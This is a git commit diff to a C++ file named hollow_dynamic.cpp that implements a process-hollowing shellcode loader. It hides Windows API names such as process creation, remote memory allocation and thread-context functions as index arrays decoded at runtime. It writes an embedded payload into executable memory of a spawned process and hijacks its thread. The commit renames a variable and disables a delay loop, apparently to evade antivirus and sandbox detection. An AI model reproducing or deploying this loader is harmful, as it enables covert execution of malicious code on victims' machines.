8b9f5b615b1a4ec85ddbd85b5d1560afdef3f559
dhanush <114467712+dagowda@users.noreply.github.com>
2025-01-04 04:03:06 -0500

    Update hollow_dynamic.cpp

--- dummyda/hollow_dynamic.cpp
+++ dummyda/hollow_dynamic.cpp
@@ -24,7 +24,7 @@ void main_star() {
 
     char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\:";
     int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
-    HMODULE istfromKernel32 = LoadLibraryA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str());
+    HMODULE istfromKe__ws_ls_32 = LoadLibraryA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str());
     std::cout <<getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str() << std::endl;
     int creatingprocess[] = {28, 17, 4, 0, 19, 4, 41, 17, 14, 2, 4, 18, 18, 26};
     int virall[] ={ 47, 8, 17, 19, 20, 0, 11, 26, 11, 11, 14, 2, 30, 23 };
@@ -41,8 +41,8 @@ void main_star() {
     std::cout <<getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)) << std::endl;
     
     
-    FARPROC pLoad_Resource = GetProcAddress(istfromKernel32, getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)).c_str());
-    FARPROC pSize_of_Resource = GetProcAddress(istfromKernel32, getoriginal(size_of_Resource, big_string, sizeof(size_of_Resource)).c_str());
+    FARPROC pLoad_Resource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)).c_str());
+    FARPROC pSize_of_Resource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(size_of_Resource, big_string, sizeof(size_of_Resource)).c_str());
      
   
     auto Size_Of_Resource_Func = (DWORD(WINAPI*)(HMODULE, HRSRC))pSize_of_Resource;
@@ -75,13 +75,13 @@ void main_star() {
                           BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
                           LPPROCESS_INFORMATION lpProcessInformation) = 
         (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
-        GetProcAddress(istfromKernel32, getoriginal(creatingprocess, big_string, sizeof(creatingprocess)).c_str());
+        GetProcAddress(istfromKe__ws_ls_32, getoriginal(creatingprocess, big_string, sizeof(creatingprocess)).c_str());
 
     LPVOID (*pvirall)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = 
-        (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(istfromKernel32, getoriginal(virall, big_string, sizeof(virall)).c_str());
+        (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(istfromKe__ws_ls_32, getoriginal(virall, big_string, sizeof(virall)).c_str());
 
     BOOL (*pwrproc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) = 
-        (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*)) GetProcAddress(istfromKernel32, getoriginal(wrproc, big_string, sizeof(wrproc)).c_str());
+        (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*)) GetProcAddress(istfromKe__ws_ls_32, getoriginal(wrproc, big_string, sizeof(wrproc)).c_str());
 
     PROCESS_INFORMATION pi = {0};
     li.cb = sizeof(li);
@@ -93,7 +93,7 @@ void main_star() {
     ctx.ContextFlags = CONTEXT_FULL;
     
     
-    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKernel32, "GetThreadContext");
+    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKe__ws_ls_32, "GetThreadContext");
     pGetThreadContext(pi.hThread, &ctx);
 
     LPVOID gallio = pvirall(pi.hProcess, NULL, code199kLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -104,24 +104,24 @@ void main_star() {
     pwrproc(pi.hProcess, gallio, code199k, code199kLen, NULL);
     ctx.Rcx = (DWORD64)gallio;
 
-    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKernel32, "SetThreadContext");
+    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKe__ws_ls_32, "SetThreadContext");
     pSetThreadContext(pi.hThread, &ctx);
 
-    auto pResumeThread = (DWORD(WINAPI*)(HANDLE)) GetProcAddress(istfromKernel32, getoriginal(reth, big_string, sizeof(reth)).c_str());
+    auto pResumeThread = (DWORD(WINAPI*)(HANDLE)) GetProcAddress(istfromKe__ws_ls_32, getoriginal(reth, big_string, sizeof(reth)).c_str());
     pResumeThread(pi.hThread); 
 }
 
 int main() {
-    unsigned long long i = 0;  // Change this value to control the flow
+    //unsigned long long i = 0;  // Change this value to control the flow
 
-    for(; i < 189642300000; i++) {
-        i += i % 0xff; 
-    }
-    printf("%llu\n", i);
+    //for(; i < 189642300000; i++) {
+        //i += i % 0xff; 
+    //}
+    //printf("%llu\n", i);
     
-    if (i == 189642300001){
+    //if (i == 189642300001){
         main_star();
-    }
+    //}
 
     return 0;
 }
